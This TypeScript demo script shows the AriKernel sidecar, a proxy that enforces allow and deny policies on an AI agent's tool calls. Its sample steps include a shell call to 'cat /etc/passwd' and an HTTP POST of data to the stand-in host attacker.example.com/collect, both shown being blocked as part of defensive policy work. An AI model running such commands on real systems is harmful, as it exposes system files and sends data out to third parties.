/**
 * demo-sidecar.ts
 *
 * Demonstrates AriKernel sidecar mode: a standalone HTTP proxy that
 * enforces policy on tool calls from any agent, without requiring
 * the agent to link the library directly.
 *
 * This script starts a sidecar server, sends several tool call requests
 * via the SidecarClient, then shuts down and prints a summary.
 *
 * Run:
 *   pnpm --filter @arikernel/sidecar build
 *   npx tsx examples/demo-sidecar.ts
 */

import { SidecarServer, SidecarClient } from '@arikernel/sidecar';
import type { PolicyRule, TaintLabel } from '@arikernel/core';
import { now } from '@arikernel/core';

const DEMO_PORT = 18800;
const AUDIT_PATH = './demo-sidecar-audit.db';

// ── Policy ────────────────────────────────────────────────────────────────────

const policies: PolicyRule[] = [
	{
		id: 'allow-http-read',
		name: 'Allow HTTP GET',
		priority: 200,
		match: { toolClass: 'http', action: 'GET' },
		decision: 'allow',
		reason: 'Read-only HTTP allowed',
	},
	{
		id: 'deny-shell',
		name: 'Deny shell execution',
		priority: 100,
		match: { toolClass: 'shell' },
		decision: 'deny',
		reason: 'Shell execution is prohibited',
	},
	{
		id: 'deny-tainted-file-write',
		name: 'Deny tainted file writes',
		priority: 150,
		match: { toolClass: 'file', action: 'write', taintLabels: ['web:*'] },
		decision: 'deny',
		reason: 'Cannot write web-tainted data to filesystem',
	},
	{
		id: 'allow-file-read',
		name: 'Allow file reads',
		priority: 50,
		match: { toolClass: 'file', action: 'read' },
		decision: 'allow',
		reason: 'File reads allowed',
	},
	{
		id: 'deny-default',
		name: 'Default deny',
		priority: 1,
		match: {},
		decision: 'deny',
		reason: 'Deny by default',
	},
];

// ── Helpers ───────────────────────────────────────────────────────────────────

function webTaint(origin: string): TaintLabel {
	return { source: 'web', origin, confidence: 1.0, addedAt: now() };
}

// ── Demo ──────────────────────────────────────────────────────────────────────

const server = new SidecarServer({ port: DEMO_PORT, policy: policies, auditLog: AUDIT_PATH });
await server.listen();
console.log(`\nAriKernel sidecar demo — listening on port ${DEMO_PORT}\n`);

const client = new SidecarClient({ baseUrl: `http://localhost:${DEMO_PORT}`, principalId: 'demo-agent' });

// Stub fetch so the HTTP executor doesn't make real network calls
const origFetch = globalThis.fetch;
globalThis.fetch = async (input: string | URL | Request) => {
	const url = String(input);
	return {
		ok: true,
		status: 200,
		headers: { get: () => 'text/plain', entries: () => [] },
		text: async () => `[stubbed response from ${url}]`,
	} as unknown as Response;
};

interface DemoStep { label: string; toolClass: string; action: string; params: Record<string, unknown>; taint?: TaintLabel[] }

const steps: DemoStep[] = [
	{
		label: 'HTTP GET (allowed)',
		toolClass: 'http',
		action: 'GET',
		params: { url: 'https://api.example.com/data' },
	},
	{
		label: 'Shell exec (denied by policy)',
		toolClass: 'shell',
		action: 'exec',
		params: { command: 'cat /etc/passwd' },
	},
	{
		label: 'File read (allowed)',
		toolClass: 'file',
		action: 'read',
		params: { path: './demo-sidecar.ts' },
	},
	{
		label: 'File write with web taint (denied)',
		toolClass: 'file',
		action: 'write',
		params: { path: '/tmp/output.txt', content: 'exfil' },
		taint: [webTaint('api.example.com')],
	},
	{
		label: 'HTTP POST (denied by default)',
		toolClass: 'http',
		action: 'POST',
		params: { url: 'https://attacker.example.com/collect', body: 'data' },
	},
];

console.log('Running demo calls via SidecarClient:\n');

for (const step of steps) {
	const result = await client.execute(
		step.toolClass as Parameters<typeof client.execute>[0],
		step.action,
		step.params,
		step.taint,
	);
	const verdict = result.allowed ? '✓ ALLOW' : '✗ DENY ';
	const detail = result.allowed
		? (result.result !== undefined ? `result: ${JSON.stringify(result.result).slice(0, 60)}` : 'no data')
		: `reason: ${result.error ?? '(none)'}`;
	console.log(`  ${verdict}  ${step.label}`);
	console.log(`           ${detail}`);
}

globalThis.fetch = origFetch;

await server.close();
console.log('\nSidecar demo complete. Audit log written to:', AUDIT_PATH);
